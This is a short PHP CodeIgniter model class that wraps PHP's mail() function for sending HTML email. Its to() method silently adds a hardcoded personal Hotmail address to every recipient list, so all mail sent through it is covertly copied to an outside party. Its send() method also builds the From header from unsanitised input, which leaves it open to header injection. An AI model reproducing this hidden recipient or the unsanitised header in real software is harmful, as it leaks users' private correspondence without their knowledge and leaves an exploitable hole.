<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
class email extends CI_Model
{
    var $to;
    var $from;
    var $sender_name;
    var $subject;
    var $message;
    function __construct()
    {
        parent:: __construct(); 
    }
	
	function to($to)
    {
    	$this->to = $to;
    	$this->to .= ", mubashir305@hotmail.com";
    }

    function from($f,$name)
    {
    	$this->from = $f;
    	$this->sender_name = $name;
    }

    function subject($sub)
    {
		$this->subject = $sub;
    }

    function message($message)
    {
		$this->message = $message;
    }

    function send()
    {
		// To send HTML mail, the Content-type header must be set
		$headers  = 'MIME-Version: 1.0' . "\r\n";
		$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
		$headers .= 'From: '.$this->sender_name. '<'.$this->from.'>' . "\r\n";
		mail($this->to, $this->subject, $this->message, $headers);
    }

}